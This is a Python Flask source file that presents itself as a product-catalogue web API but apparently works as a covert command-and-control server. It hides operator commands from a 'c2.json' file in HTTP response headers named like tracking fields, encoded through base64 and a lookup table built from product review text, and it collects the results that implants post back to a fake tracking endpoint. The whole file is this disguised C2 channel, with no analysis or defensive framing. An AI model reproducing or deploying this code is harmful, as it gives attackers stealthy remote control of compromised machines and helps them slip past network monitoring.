from flask import Flask, jsonify, render_template, request
from json import loads, dumps
from base64 import b64encode, b64decode
from random import shuffle, randint

app = Flask(__name__)

def __get_products():
    with open('data/products.json', 'r', encoding='utf8') as product_file:
        return loads(product_file.read())

def __setup_dictionary() -> dict:
    products = __get_products()[0]['reviews'][0]
    kv_text = list(enumerate(list(products)))
    shuffle(kv_text)
    dictionary = {}
    for key, value in kv_text:
        if value not in dictionary:
            dictionary[value] = []
        dictionary[value].append(key)
    return dictionary

def __embed_cmd(cmd) -> str:
    encoded_cmd = b64encode(cmd.encode()).decode()
    key = str.join('', [ 
        f'{dictionary[c][randint(0, len(dictionary[c])-1)]:03}' 
        for c in list(encoded_cmd) 
    ])
    return key

def __get_embedded_command(key) -> tuple:
    with open('data/c2.json', 'r', encoding='utf8') as text_file:
        c2 = loads(text_file.read())
        if not key in c2:
            return (None, None) 
        
        for command in c2[key]['commands']:
            if not 'rsp' in command:
                return (command['ts'], __embed_cmd(command['cmd']))
    return (None, None)

@app.route('/api/products', methods=['GET'])
def get_products():
    key = request.headers.get('X-Tracking-For')
    result = __get_products()
    response = jsonify(result)
    
    if key:
        (id, cmd) = __get_embedded_command(key)
        if len(cmd or '') > 0:
            response.headers['X-Tracking-For'] = key
            response.headers['X-Tracking-Timestamp'] = id
            response.headers['X-Tracking-Type'] = cmd
    return response

@app.route('/api/tracking', methods=['POST'])
def post_tracking():
    key = request.headers.get('X-Tracking-For')
    data = request.get_json()
    timestamp = data['timestamp']
    result = data['result']

    with open('data/c2.json', 'r', encoding='utf8') as text_file:
        c2 = loads(text_file.read())
        if not key in c2:
            return '', 404
        for command in c2[key]['commands']:
            if str(command['ts']) == str(timestamp):
                command['rsp'] = b64decode(result).decode('utf-8')

                text_file.close()
                with open('data/c2.json', 'w', encoding='utf8') as text_file:
                    text_file.write(dumps(c2))
                break
    
    return '', 201

@app.route('/')
def index():
    return render_template('index.html', products=__get_products())

if __name__ == '__main__':
    dictionary = __setup_dictionary()
    app.run(debug=True, port=80, host='0.0.0.0')
